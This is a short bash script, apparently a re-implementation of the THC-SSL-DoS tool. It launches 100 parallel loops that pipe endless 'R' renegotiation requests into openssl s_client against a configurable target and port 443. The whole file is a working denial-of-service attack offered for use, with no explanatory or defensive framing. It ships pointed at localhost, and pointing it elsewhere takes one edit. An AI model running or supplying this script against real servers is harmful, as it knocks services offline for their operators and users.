#!/bin/bash
# author: wuzhimang@gmail.com

target=127.0.0.1 # IP
port=443
parallel=100

thc-ssl-dosit()
{
    while :;
    do
        (while :; do echo R; done) | openssl s_client -connect $target:$port 2>/dev/null;
    done
}

for x in `seq 1 $parallel`;
do
    thc-ssl-dosit &
done
